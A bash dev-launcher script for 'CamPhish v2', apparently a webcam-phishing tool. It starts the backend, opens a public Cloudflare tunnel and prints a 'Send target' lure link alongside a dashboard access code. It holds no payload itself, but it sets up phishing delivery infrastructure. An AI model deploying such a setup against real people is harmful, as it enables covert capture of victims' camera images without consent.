#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PROJECT_DIR="$(dirname "$SCRIPT_DIR")"
cd "$PROJECT_DIR"

TUNNEL="${TUNNEL:-cloudflared}"
CARGO_MODE="${RELEASE:+--release}"

cleanup() {
    echo ""
    echo "Shutting down..."
    docker stop camphish-dev-tunnel 2>/dev/null || true
    docker rm camphish-dev-tunnel 2>/dev/null || true
    [ -n "${BACKEND_PID:-}" ] && kill "$BACKEND_PID" 2>/dev/null && wait "$BACKEND_PID" 2>/dev/null || true
    [ -n "${FRONTEND_PID:-}" ] && kill "$FRONTEND_PID" 2>/dev/null || true
    rm -f "$BACKEND_LOG" "$FRONTEND_LOG" "$TUNNEL_LOG" 2>/dev/null || true
    exit 0
}
trap cleanup INT TERM EXIT

get_access_code() {
    grep -oE '[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}' < "$BACKEND_LOG" 2>/dev/null | tail -1
}

wait_healthy() {
    until curl -sf http://localhost:8080/api/health > /dev/null 2>&1; do sleep 2; done
}

BACKEND_LOG=$(mktemp /tmp/camphish-backend-XXXX.log)
FRONTEND_LOG=$(mktemp /tmp/camphish-frontend-XXXX.log)
TUNNEL_LOG=$(mktemp /tmp/camphish-tunnel-XXXX.log)

echo "=== CamPhish Local Dev ==="

# ─── pre-flight checks ─────────────────────────────────────────────────────────

if curl -sf http://localhost:8080/api/health > /dev/null 2>&1; then
    echo "❌ Port 8080 is already in use (Docker or another process)."
    echo "   Run 'docker compose down' or stop the other process first."
    echo "   Or use 'docker-start.sh' instead."
    echo ""
    echo "   Already running Docker? → ./scripts/docker-start.sh"
    exit 1
fi

if ! command -v npm &>/dev/null; then
    echo "❌ npm not found. Install Node.js first."
    exit 1
fi

if [ ! -d "$PROJECT_DIR/frontend/node_modules" ]; then
    echo ""
    echo "⚠️  frontend/node_modules missing. Running npm install..."
    cd "$PROJECT_DIR/frontend" && npm install
    cd "$PROJECT_DIR"
fi

# ─── 1. Start backend ──────────────────────────────────────────────────────────

echo ""
echo "[1/5] Starting backend (cargo run${RELEASE:+ --release})..."

cd "$PROJECT_DIR/backend"
cargo run $CARGO_MODE > "$BACKEND_LOG" 2>&1 &
BACKEND_PID=$!

echo -n "  Compiling and starting..."
wait_healthy
echo " ready!"
cd "$PROJECT_DIR"
ACCESS_CODE=$(get_access_code)
echo "  🔐 Code: ${ACCESS_CODE:-<still compiling, check later>}"

# ─── 2. Start tunnel ───────────────────────────────────────────────────────────

TUNNEL_URL=""

if [ "$TUNNEL" = "cloudflared" ]; then
    echo "[2/5] Starting Cloudflare Tunnel..."

    docker rm -f camphish-dev-tunnel 2>/dev/null || true

    # host.docker.internal resolves to host on macOS; --add-host makes it work on Linux
    HOST_DOCKER="host.docker.internal"
    docker run --name camphish-dev-tunnel \
        --add-host "$HOST_DOCKER:host-gateway" \
        cloudflare/cloudflared:latest \
        tunnel --url "http://$HOST_DOCKER:8080" --no-autoupdate \
        > "$TUNNEL_LOG" 2>&1 &
    TUNNEL_PID=$!

    echo -n "  Waiting for tunnel URL"
    for i in $(seq 1 90); do
        TUNNEL_URL=$(grep -oE 'https://[a-z0-9-]+\.[a-z0-9-]+\.(try\.cloudflare\.com|cf)' < "$TUNNEL_LOG" | tail -1) || true
        [ -n "$TUNNEL_URL" ] && break
        echo -n "."
        sleep 2
    done
    echo ""

    if [ -z "$TUNNEL_URL" ]; then
        echo " failed"
        echo "  ⚠️  Tunnel unavailable. Continuing without tunnel."
        TUNNEL=""
    else
        echo " $TUNNEL_URL"
        echo "  ✅ Tunnel ready"
    fi

elif [ "$TUNNEL" = "ngrok" ]; then
    echo "[2/5] Ngrok tunnel requires manual setup for local dev."
    echo "  Run: docker run --rm ngrok/ngrok:latest http host.docker.internal:8080"
    TUNNEL=""
fi

# ─── 3. Restart backend with tunnel URL ────────────────────────────────────────

if [ -n "$TUNNEL_URL" ]; then
    echo "[3/5] Restarting backend with tunnel URL..."

    TUNNEL_URL="${TUNNEL_URL%/}"
    if grep -q "^CAMPHISH_URL=" .env 2>/dev/null; then
        sed -i '' "s|^CAMPHISH_URL=.*|CAMPHISH_URL=$TUNNEL_URL|" .env
    else
        echo "CAMPHISH_URL=$TUNNEL_URL" >> .env
    fi

    kill "$BACKEND_PID" 2>/dev/null && wait "$BACKEND_PID" 2>/dev/null || true
    sleep 1  # let the port release
    cd "$PROJECT_DIR/backend"
    cargo run $CARGO_MODE > "$BACKEND_LOG" 2>&1 &
    BACKEND_PID=$!
    cd "$PROJECT_DIR"

    echo -n "  Waiting for restart..."
    wait_healthy
    echo " ready!"
    ACCESS_CODE=$(get_access_code)
else
    echo "[3/5] Skipped (no tunnel)"
fi

# ─── 4. Build frontend SPA (so backend can serve it at /) ──────────────────────

echo "[4/5] Building frontend SPA..."
cd "$PROJECT_DIR/frontend"
npm run build > /dev/null 2>&1
cd "$PROJECT_DIR"
echo "  ✅ Frontend built (served at / by backend)"

# ─── 5. Summary ────────────────────────────────────────────────────────────────

echo "[5/5] Dev environment ready"
echo ""

if [ -n "$TUNNEL_URL" ]; then
    echo "╔════════════════════════════════════════════════════════════╗"
    echo "║               CamPhish v2 — Local Dev                     ║"
    echo "╠════════════════════════════════════════════════════════════╣"
    printf "║  🎯 Backend:    http://localhost:8080                      ║\n"
    printf "║  🌐 Tunnel:     %-42s  ║\n" "$TUNNEL_URL"
    printf "║  🔐 Dashboard:  http://localhost:8080/?code=%s  ║\n" "${ACCESS_CODE:-<unknown>}"
    printf "║                                                           ║\n"
    printf "║  Send target:   %s/t/face-runner  ║\n" "$TUNNEL_URL"
    echo "╚════════════════════════════════════════════════════════════╝"
else
    echo "╔════════════════════════════════════════════════════════════╗"
    echo "║               CamPhish v2 — Local Dev                     ║"
    echo "╠════════════════════════════════════════════════════════════╣"
    printf "║  🎯 Backend:    http://localhost:8080                      ║\n"
    printf "║  🔐 Dashboard:  http://localhost:8080/?code=%s  ║\n" "${ACCESS_CODE:-<unknown>}"
    echo "╚════════════════════════════════════════════════════════════╝"
fi

echo ""
echo "  Backend logs:  tail -f $BACKEND_LOG"
echo "  Frontend logs: tail -f $FRONTEND_LOG"
[ -n "$TUNNEL_URL" ] && echo "  Tunnel logs:   tail -f $TUNNEL_LOG"
echo ""
echo "  Hot-reload: Edit frontend/src/* and backend/src/* and recompile"
echo "  Ctrl+C to stop all services"
echo ""

wait
